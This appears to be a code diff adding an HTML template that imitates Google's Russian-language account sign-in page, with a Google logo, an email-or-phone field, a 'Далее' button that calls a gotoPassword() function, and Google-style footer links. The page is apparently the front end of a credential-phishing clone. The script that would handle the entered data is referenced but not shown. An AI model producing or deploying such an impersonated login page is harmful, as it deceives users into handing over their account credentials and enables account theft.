@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org" lang="en">
+
+<link rel="stylesheet" href="../static/css/bootstrap.min.css">
+<link rel="stylesheet" type="text/css" media="all"
+      href="../static/css/style.css" th:href="@{/css/style.css}" />
+<link rel="stylesheet" type="text/css" media="all"
+      href="../static/css/style.css" th:href="@{/css/bootstrap.min.css}" />
+<link type="text/css" href="webjars/bootstrap/4.1.1/css/bootstrap.min.css"
+      rel="stylesheet">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Title</title>
+</head>
+<body>
+
+<main>
+
+    <section class="container-fluid text-center d-flex justify-content-center" id="root">
+
+        <div style="width: 33%!important; height: 70%!important; border: 2px solid rgba(175,175,175,0.5);!important; border-radius: 15px!important;" class="row mt-5 w-100 mb-5 text-center d-flex justify-content-center">
+            <img height="49" width="101" class="mt-5 text-center d-flex justify-content-center" th:src="@{/images/gog.jpg}" src="../static/images/gog.jpg" style="">
+            <h3 class="col-12 mt-3">Вход</h3>
+            <h6 class="col-12">Используйте аккаунт Google</h6>
+            <input required="required" oninvalid="InvalidMsg(this)" style="height: 50px!important;" class="col-10 form-control" id="email" placeholder="Телефон или address эл почты">
+            <p id="error1" style="font-size: 12px; display: none; color: red">! Введите адрес электронной почты или номер телефона.</p>
+            <a href="/" type="button" class="" style="font-weight: bold">Забыли адрес электронной почты?</a>
+            <div class="mt-3 col-11 ml-2 mr-2">Работаете на чужом компьютере? Используйте режим "Приватный просмотр". <a href="/">Подробнее…</a></div>
+            <div class="col-12 mt-5 mb-5">
+                <a href="/" type="button" class="btn float-left mb-2">Cоздать аккаунт</a>
+                <button onclick="gotoPassword()" type="submit" class="btn btn-primary float-right mb-2" style="color: white">Далее</button>
+            </div>
+        </div>
+
+    </section>
+
+<footer class="container-fluid text-center d-flex justify-content-center">
+    <div style="width: 33%!important;" class="row">
+        <div class="col-4 float-left">
+            <p class="float-left" style="font-size: 11px">Русский</p>
+        </div>
+
+        <div class="col-2 ml-2">
+            <p style="font-size: 11px">Справка</p>
+        </div>
+
+        <div class="col-2 ml-2">
+            <p style="font-size: 11px">Конфиденциальность</p>
+        </div>
+
+        <div class="col-2 ml-5 float-right">
+            <p style="font-size: 11px">Условия</p>
+        </div>
+    </div>
+
+</footer>
+</main>
+<script th:inline="javascript" th:src="@{/js/js.js}" src="../static/js/js.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.css" rel="stylesheet" type="text/css" />
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+
+</body>
+</html>
